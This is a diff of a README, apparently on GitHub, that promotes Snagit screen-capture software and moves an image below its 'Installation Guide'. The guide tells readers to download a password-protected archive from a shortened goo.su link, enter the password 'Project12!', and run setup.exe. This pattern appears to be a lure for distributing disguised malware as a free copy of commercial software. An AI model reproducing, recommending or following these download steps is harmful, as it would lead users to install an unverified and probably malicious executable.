@@ -12,13 +12,15 @@ When everything works together, creating and sharing professional content is fas
                                                           Easy to use, but full of advanced features
 Don’t let clumsy built-in snipping tools hold you back. Snagit has all the tools you need, making it the best screen capture software for professionals.
 
-![image](https://github.com/user-attachments/assets/db3a5815-d0e8-4aa5-88dd-4af17906e732)
 
 📥 Installation Guide
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
 1️⃣ **[Download](https://goo.su/Kr9l) and extract archive(pass: Project12!)**  
 2️⃣ **Run `setup.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
+
+![image](https://github.com/user-attachments/assets/db3a5815-d0e8-4aa5-88dd-4af17906e732)
+
 
 ⚠️ Note: This method ensures a quick and hassle-free installation.
 
